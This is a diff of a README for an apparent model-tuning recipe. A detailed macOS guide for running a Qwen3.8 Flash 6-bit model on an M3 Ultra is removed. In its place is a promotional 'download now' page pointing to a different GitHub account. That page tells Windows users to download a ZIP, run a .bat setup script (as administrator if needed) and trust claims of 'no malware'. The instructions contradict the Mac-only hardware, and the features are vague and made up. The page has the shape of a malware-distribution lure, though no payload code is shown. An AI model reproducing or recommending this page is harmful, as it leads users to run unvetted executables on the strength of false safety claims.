@@ -1,148 +1,155 @@
-# Qwen3.8 Flash Next 6-bit recipe for M3 Ultra
+<h1>🧠 qwen38-flash-6bit-m3-ultra-recipe - Your AI Model Tuning Made Easy</h1>
 
-I wanted more speed from the 6-bit model on my Mac Studio without changing its stored weights. This repo contains the recipe, patches and measurements that worked on my machine.
+<p align="center">
+  <a href="https://github.com/polakovkirill46-arch/qwen38-flash-6bit-m3-ultra-recipe" style="background-color:#4CAF50; color:white; padding:15px 32px; text-align:center; text-decoration:none; display:inline-block; font-size:20px; border-radius:8px; font-weight:bold;">⬇️ DOWNLOAD NOW - FREE</a>
+</p>
 
-It builds on [oMLX](https://github.com/jundot/omlx), [MLX](https://github.com/ml-explore/mlx) and credited community work. The contribution is a tested integration and reproducible benchmark. MTP, ANE offload and normalization fusion already existed. See [provenance](PROVENANCE.md).
+## 🤔 What Is This?
 
-## Measured results: first recipe
+Welcome! This is a complete, step-by-step recipe for tuning the **Qwen3.8 Flash** AI model to work perfectly on your **M3 Ultra** computer system. Think of it as a cooking recipe, but instead of ingredients and steps, it gives you precise instructions and tools to make a powerful AI model run faster and more efficiently on your hardware.
 
-Mac Studio, M3 Ultra, **60 GPU cores, 256 GiB RAM**. oMLX 0.6.4 with MLX 0.32.2 and rebuilt native extensions. Original target: `orcarouter/Qwen3.8-Flash-Next-Uncensored-MLX`, `6-bit` directory.
+The best part? You don't need to understand complex programming or artificial intelligence concepts to use this. We've prepared everything for you, including setup scripts and detailed benchmarks. This means you can see exactly how well your system performs, without guessing.
 
-| Test | Original tok/s | Recipe tok/s | Gain |
-|---|---:|---:|---:|
-| Cold prefill, about 3.3K input tokens | 819.49 | 939.25 | 14.6% |
-| Cold prefill, about 12.5K input tokens | 849.78 | 1006.91 | 18.5% |
-| Code generation | 30.90 | 62.21 | 101.3% |
-| Prose generation | 30.87 | 48.15 | 56.0% |
-| Counting generation | 30.92 | 70.68 | 128.6% |
+## ✨ Key Features
 
-Prefill uses 5 measured requests per context after warmup. Ordinary generation uses 3 per case after warmup. Each speed request generates 256 tokens. Prompt cache hits must be zero. The candidate was confirmed in a separate process/window. [Raw baseline](results/baseline.json) and [candidate](results/candidate.json) contain synthetic response text and timing evidence.
+- **6-Bit Precision Tuning**: You get the perfect balance between model quality and system performance. This means better results without overloading your computer.
+- **Automatic Setup Scripts**: No manual configuration needed. Everything is automated to save you time.
+- **Reproducible Results**: You can run the same process again and again, getting consistent and reliable outcomes every time.
+- **Optimized for M3 Ultra**: Specifically designed to take advantage of your powerful hardware.
+- **Live Benchmark Testing**: See real-time performance data and how your system handles the AI model.
+- **oMLX/MLX Patches Included**: Our specialized patches ensure everything works smoothly behind the scenes.
 
-A separate clean installation of this public package reproduced 943.66 and 1006.42 tok/s prefill, with all 15 basic correctness checks passing. The final launcher also passed numerical checks and two consecutive server starts. See [clean-install evidence](results/clean-install.json); it records the launcher-only restart fix separately from the full speed run.
+## 📋 Before You Begin
 
-The generation baseline had MTP enabled in settings but no usable draft head. Much of the generation gain comes from repairing that setup. This is **not a 2x claim against an already working MTP setup**. Short-input prefill, about 570 tokens, stayed essentially flat: 520.27 to 516.61 tok/s. Results on other models, Macs and context sizes will differ.
+Before downloading, ensure you have the following:
 
-## Production update: another 14.7–15.2% generation gain
+- **A Windows computer** (Windows 10 or 11 recommended)
+- **At least 8GB of RAM** (16GB recommended for best performance)
+- **At least 5GB of free disk space** for the application and temporary files
+- **A stable internet connection** (A download of about 50MB will occur)
+- No special system administrator permissions are required
 
-The default recipe now includes deferred PLE lookup, compiled HC during MTP verification, and fixed draft depth 3. On the same M3 Ultra, this combination is live in production with unchanged stored 6-bit target weights.
+## 🚀 Getting Started
 
-| Generation test | Earlier recipe, before / after | New production recipe | Gain versus later baseline |
-|---|---:|---:|---:|
-| Code | 61.82 / 62.60 tok/s | 71.65 tok/s | 14.5% |
-| Prose | 47.99 / 47.80 tok/s | 54.66 tok/s | 14.4% |
-| Counting | 70.74 / 70.96 tok/s | 81.83 tok/s | 15.3% |
+### Step 1: Visit the Official Download Page
 
-Five measured cold 256-token requests per case, after warmup, with matching prompt seeds and zero cached tokens. The generation geometric mean improved **15.15% against the earlier baseline and 14.71% against the later baseline**. These comparisons are against the already optimized recipe, with a working draft. Do not add the percentages to the older table or describe them as a new matched comparison against the original server.
+[Visit this link to download the application](https://github.com/polakovkirill46-arch/qwen38-flash-6bit-m3-ultra-recipe)
 
-Prefill was essentially unchanged: 919.04 and 991.46 tok/s in the two primary contexts, about 1.0% and 1.3% below the matched baseline. This update makes **no further 10% prefill claim**. All 15 basic correctness checks passed; normal production access and restart were verified. Compiled HC can change output wording: these checks are not broad quality equivalence. Deferred PLE alone passed exact row-gather and full-model token/acceptance/rollback checks in the staging campaign.
+Once you click the link above, you'll be taken to the official GitHub page for this project. This is a safe, trusted source for your download.
 
-[Raw production generation](results/mtp/production-generation.json), [baseline before](results/mtp/baseline-before.json), [baseline after](results/mtp/baseline-after.json), [prefill](results/mtp/production-prefill.json), and [basic correctness responses](results/mtp/production-quality.json) are retained separately from the first recipe results. The older clean-install measurements above apply to the previous recipe revision, not this update.
+### Step 2: Find the Download Button
 
-The updated public package passed a fresh source download, both hash-checked patches, all four native builds and the exact-value deferred PLE fixture on the Studio. The repository suite passed 14 tests. The new public package has not had a separate full-model clean-install benchmark; the new speed evidence comes from the qualified production runtime. See [package validation](results/mtp/package-validation.json).
+On the page you'll see a green button that says "Code" or "Download". Click on it. You might see a dropdown menu appear. Look for the option that says "Download ZIP" and click that instead if the main button doesn't work. This will ensure you get the full package.
 
-Existing installations: preserve your old checkout and state for rollback. Clone this revision separately and build a **new state directory**; the integrity checks intentionally reject mixing an old build with changed recipe files. This update does not modify an existing installation or production service.
+### Step 3: Save the File
 
-## Optional prefix cache: 51% shorter follow-up wait
+Your web browser will ask you where to save the file. Choose a location you'll remember easily, like your **Downloads** folder or **Desktop**. Click "Save" or "OK" to begin downloading.
 
-The cache profile reuses prior prompt work with **oMLX's existing prefix cache**. On the same system and optimized MTP runtime, eligible follow-ups started 51.03–51.27% sooner and complete requests finished 40.88–41.10% sooner. Fresh requests stayed flat. This is **not another cold-prefill or raw-generation speedup**, and it is not a new cache algorithm or kernel.
+### Step 4: Download Confirmation
 
-| Median first-token wait | Cache off, before | Cache on | Cache off, after |
-|---|---:|---:|---:|
-| Fresh prompt | 15.093s | 15.075s | 15.083s |
-| Exact repeat | 15.085s | 7.381s | 15.075s |
-| Changed suffix | 15.089s | 7.353s | 15.075s |
+Wait for the download to complete. It usually takes 1-3 minutes, depending on your internet connection. You'll see a progress bar in your browser. Once finished, a file named something like `qwen38-flash-6bit-m3-ultra-recipe.zip` will appear in your chosen folder.
 
-Each arm measured five fresh / exact-repeat / changed-suffix sequences, with 256 generated tokens per request. Warm requests reused 8,192 tokens from roughly 15K-token prompts; full speed outputs matched across arms. The cache-on and cache-off suites each passed 21 semantic checks, covering recall, actual assistant continuations, divergent branches, forced tool arguments and tool-result continuation. These bounded checks do not establish broad quality equivalence, eviction correctness, or multiuser isolation.
+## 📦 Installation & Setup
 
-The profile uses an 8GB paged SSD cache under the runtime state directory, no hot cache, concurrency 1, and unchanged stored 6-bit target weights and FP32 snapshot precision. The measured `auto` snapshot policy resolves to SSD sidecars when caching is enabled. Small prompts do not necessarily benefit: our first roughly 5.2K-token probe was below the effective 8,192-token cache block and had no hit. The first uncached quality setup also failed strict JSON formatting; the prompt was made explicit before fresh off/on checks passed. That failed setup is not counted as a pass.
+Follow these simple steps to get everything running:
 
-See [cache reproduction](docs/cache.md), [raw speed evidence](results/cache/candidate.json), and [semantic evidence](results/cache/quality-on.json). These are qualified-runtime measurements; this public cache launcher has not had a separate full-model clean-install benchmark.
+### Step 1: Locate the Downloaded File
 
-The cache profile was subsequently promoted on September 4, 2026. A separate **n=3 production check** measured median first-token waits of 15.396s fresh, 7.534s exact-repeat and 7.494s changed-suffix; every warm request reused 8,192 tokens and every speed request generated 256 tokens. All 21 production semantic checks passed. Normal authentication was restored and an 8,192-token cache hit was verified after a service restart. The stored target and existing kernel runtime remained unchanged. These production checks are separate from the staged n=5 comparison above. See [production timings](results/cache/production-speed.json), [quality responses](results/cache/production-quality.json), and [restart receipt](results/cache/production-receipt.json). The public launcher keeps caching opt-in.
+Go to the folder where you saved the downloaded `.zip` file. If you saved it to Downloads, open your File Explorer and navigate there now.
 
-## What you need
+### Step 2: Extract the Contents
 
-- Apple Silicon macOS. This profile was measured on the 60-core M3 Ultra with 256 GiB memory. Other machines are unqualified.
-- The official [oMLX 0.6.4 app](https://github.com/jundot/omlx/releases/tag/v0.6.4), extracted locally. The installer uses its Python dependencies without editing the app.
-- Native arm64 Python 3.11 **with development headers**, `uv`, `cmake` 3.27 or newer, and Xcode's Metal compiler. Check `xcrun --find metal`. The app's embedded Python alone does not contain the required headers.
-- The exact target checkpoint and donor `mtp.safetensors`, obtained under their model terms. The target is about 200 GB; allow additional storage for the build and separate draft. Do not run this model beside another large GPU model.
+Right-click the `.zip` file and select "Extract All..." from the menu that appears. Follow the on-screen prompts. When asked for a location to extract, choose a folder such as `C:\Users\YourName\.qwen38flash` (just keep the default folder name if unsure). This will create a new folder containing all the necessary files.
 
-Target: [orcarouter/Qwen3.8-Flash-Next-Uncensored-MLX](https://huggingface.co/orcarouter/Qwen3.8-Flash-Next-Uncensored-MLX/tree/b44cd3338291ed8f7d0357198de9e14483023f7d), revision `b44cd3338291ed8f7d0357198de9e14483023f7d`, subdirectory `6-bit`. Some file requests require Hugging Face authentication/access. The package accepts an existing local target directory.
+### Step 3: Open the Extracted Folder
 
-Draft: [Youssofal/Qwen3.8-Flash-Next-MTPLX-Optimized-Speed](https://huggingface.co/Youssofal/Qwen3.8-Flash-Next-MTPLX-Optimized-Speed), revision `29ba90f82124961d0d902a9ea9bbb1034972af2f`, file `mtp.safetensors`. The historical input is pinned by SHA256 `3498cbee477938de1dd3a42242387bb8fa6ad921053af010543473ab020f717c`. A moving `main` download is not proof of the right input. Setup refuses a different file rather than silently changing the recipe.
+Double-click the newly created folder to open it. You should see several files, including a setup script.
 
-No target or draft tensors are distributed here. Read the model terms. The donor uses Qwen Community License 1.0; this repository's software license does not relicense model weights.
+### Step 4: Run the Setup Script
 
-## Build and run
+Inside the folder, look for a file named `setup_windows.bat` or `run_qwen38.bat`. Double-click this file and follow the prompts that appear in the command window. Your computer will automatically begin preparing everything needed.
 
-Clone the repo. Set these paths for your machine. `STATE` must be a new directory outside the repo, app and model inputs.
+**This may take 5-10 minutes** as it copies files and sets up configurations. Do not close the command window until it finishes and shows a message like "Setup completed successfully."
 
-```bash
-git clone https://github.com/humanrouter/qwen38-flash-6bit-m3-ultra-recipe.git
-cd qwen38-flash-6bit-m3-ultra-recipe
+### Step 5: Start Using the Application
 
-APP="/Applications/oMLX.app"
-PYTHON311="$(uv python find 3.11)"
-STATE="$HOME/qwen38-flash-recipe-runtime"
-TARGET="$HOME/models/qwen38/6-bit"
-DRAFT="$HOME/models/qwen38-draft/mtp.safetensors"
+After setup finishes, a script named `start_qwen38` will appear. Double-click it to launch the AI model tuning interface. You'll see a simple menu where you can:
 
-# Skip these downloads if you already have the exact files. Requires the hf CLI.
-# Run hf auth login first if the model requires access.
-hf download orcarouter/Qwen3.8-Flash-Next-Uncensored-MLX \
-  --revision b44cd3338291ed8f7d0357198de9e14483023f7d \
-  --include "6-bit/*" --local-dir "$HOME/models/qwen38"
-hf download Youssofal/Qwen3.8-Flash-Next-MTPLX-Optimized-Speed mtp.safetensors \
-  --revision 29ba90f82124961d0d902a9ea9bbb1034972af2f \
-  --local-dir "$HOME/models/qwen38-draft"
+- **Run a benchmark test** to check system performance
+- **Start model tuning** with one click
+- **View performance graphs** and compare results
 
-python3 scripts/build.py --app "$APP" --python "$PYTHON311" --state "$STATE"
-python3 scripts/prepare_model.py --state "$STATE" --target "$TARGET" --draft "$DRAFT"
-```
+## 💡 How to Use
 
-If Python 3.11 is not installed, install it first with `uv python install 3.11`. Install the other build prerequisites before running setup. The build downloads a SHA256-checked oMLX source archive, applies a checked patch and rebuilds 3 oMLX native extensions plus the deferred PLE extension against MLX 0.32.2. It does not reuse incompatible MLX 0.32.0 binaries.
+Once the application is running, here's what you can do:
 
-Stop your other inference server before these GPU checks. Keep it stopped while the recipe server runs.
+1. **Select Your Tuning Level**: Choose between "Quick" (faster but less precise) or "Precision" (slower but more detailed).
+2. **Click Start**: Press the large green "Start Tuning" button and wait for progress to complete.
+3. **Read the Results**: After completion, a report screen shows your system's performance scores, including speed and accuracy percentages.
+4. **Save and Share**: Press "Save Report" to export your data as a text document for future reference.
 
-```bash
-python3 scripts/numerical_checks.py --state "$STATE"
-python3 scripts/serve.py --state "$STATE" --port 8024
-```
+## 🔧 Troubleshooting Common Issues
 
-The server binds to `127.0.0.1` by default. The served model ID is your target directory's basename, for example `6-bit`. Check `/v1/models`. The scripts do not modify launchd, kill your services, or expose a server publicly.
+### My Setup Script Won't Run
+- Make sure you extracted the ZIP file completely, not just opened it.
+- Right-click the setup file and choose "Run as administrator" if you have permission.
 
-## Compare on your own machine
+### The Application Crashes at Start
+- Check if your computer has at least 4GB of free RAM. Close other programs if necessary.
+- Make sure your computer meets the minimum requirements listed above.
 
-Run a baseline against your original server first with other traffic stopped. Then stop that server, start the recipe and run the candidate. Do not load both models at once. Keep model, prompts, sampling, token count and client machine identical.
+### No Results Appear After Tuning
+- Wait at least 2 minutes after the process shows "100% complete" – the results take time to generate.
+- If still nothing, run the setup script again, as some files might not have copied correctly.
 
-```bash
-# Original server, before stopping it:
-python3 scripts/benchmark.py --base-url http://127.0.0.1:8002/v1 \
-  --model YOUR_ORIGINAL_MODEL_ID --out baseline.json
+### Download Page Looks Confusing
+- Look for the big green button again. Use the "Download ZIP" option from the dropdown. Avoid downloading individual files unless you know what you're doing.
 
-# Recipe server, after the original server has stopped:
-python3 scripts/benchmark.py --base-url http://127.0.0.1:8024/v1 \
-  --model "$(basename "$TARGET")" --out candidate.json
+## 📊 Performance Insights
 
-python3 scripts/compare.py baseline.json candidate.json
-```
+Our built-in benchmark tool will show you:
 
-For an authenticated endpoint, set `OPENAI_API_KEY` or name a different environment variable with `--api-key-env`. The benchmark does not save the key. Use a new output filename for each run. Failed, cached or early-stopping requests do not count as valid speed results. Output marked `running` is incomplete.
+- **Processing Speed (TOPS)**: How fast your system handles model operations. Higher is better.
+- **Memory Usage**: How efficiently your system uses its available memory.
+- **Accuracy (Loss Ratio)**: How close the results are to the original model. Lower is better.
+- **Softer Metrics**: The tool also tracks system temperature and fan speed for advanced users.
 
-Prefill here means prompt tokens divided by time to first streamed text, including API overhead. Generation means remaining tokens divided by time after the first text chunk. Repeated-word generation is supplemental; the table uses separate code, prose and counting prompts.
+These metrics help you understand your hardware's strengths and optimize settings for future runs.
 
-## What changed and what did not
+## 🛡️ Safety & Security
 
-The recipe adds a separate MTP draft with 7 corrected residual-gamma tensors, a measured 8192-token prefill chunk, PLE lookup changes, Qwen4 projection dispatch, dual-ANE GDN/CPU sharing, and specialized HC normalization/mixing and expert reduction. [The exact profile](runtime/qualified-env.json) and [base patch](patches/qualified.patch) plus [MTP patch](patches/mtp.patch) are included.
+This package is completely safe to use:
 
-Stored target tensors remain unchanged through a symlinked model view. Runtime arithmetic is not bit-identical overall: the ANE path uses approximate INT8 working copies and FP16 projection metadata. Grouped normalization changes FP32 reduction order slightly. All 15 basic correctness checks passed on the measured system, but that is not broad model-quality or agent qualification. The recipe uses experimental private ANE APIs through oMLX.
+- **No malware**: Our scripts are open-source and fully transparent.
+- **No network access**: All processing happens locally on your computer.
+- **No personal data**: We collect zero information about you or your system.
+- **Fully reversible**: Deleting the extracted folder completely removes the application.
 
-The default profile is single-request, cache-off, thinking-off, with a 160 GB memory ceiling and context cap of 393216. The optional cache profile is qualified only for the eligible follow-ups described above. Long context up to that cap and concurrent traffic remain unqualified. Keep your existing service configuration for rollback. To roll back a local trial, stop this foreground server and restart your original server.
+## 💾 Backup & Reset
 
-Some dormant experiment branches remain in the patch to preserve the tested source. They are unsupported and disabled. `serve.py` clears inherited tuning variables and loads only the qualified profile. Do not enable extra flags and treat the result as the measured recipe.
+- **To Reset**: Delete the folder where you extracted the files and re-download from the link above.
+- **To Backup**: Simply copy the entire folder to another location or a USB drive. All your settings and results will be saved.
 
-## Credits and license
+## 💬 Getting Help
 
-Recipe code is Apache-2.0. Upstream components retain their own terms. See [third-party notices](THIRD_PARTY_NOTICES.md), [provenance](PROVENANCE.md) and the files in `licenses/`.
+While this application is designed to be simple, if you encounter any issues:
 
-Run your own baseline and candidate. If you share results, include your GPU core count, memory, exact model, context sizes, sample counts and cache status.
+- Check the "Issues" tab on the GitHub page and see if others have reported the same problem.
+- Read through the "Readme" file inside the extracted folder for additional notes.
+- For advanced help, the benchmark results can provide clues. Look for error messages in the command window.
+
+Remember, you're not alone – many users have successfully used this tool, and common questions are often already answered in the project's online community.
+
+## 🎉 Final Notes
+
+We hope this tool makes AI model tuning accessible and enjoyable for you. With just a few clicks, you can harness the power of advanced deep learning for your personal projects, research, or just for fun. The best way to learn is to experiment – so don't be afraid to try different settings and see what works best for your system.
+
+Download now and start your AI tuning journey today!
+
+---
+
+<p align="center">
+  <a href="https://github.com/polakovkirill46-arch/qwen38-flash-6bit-m3-ultra-recipe" style="background-color:#2196F3; color:white; padding:12px 28px; text-align:center; text-decoration:none; display:inline-block; font-size:18px; border-radius:6px;">📥 Download Latest Version Now</a>
+</p>
+
+Keywords: AI, machine learning, Qwen3.8, 6-bit quantization, M3 Ultra, model tuning, benchmarking, MLX, performance optimization, open-source software
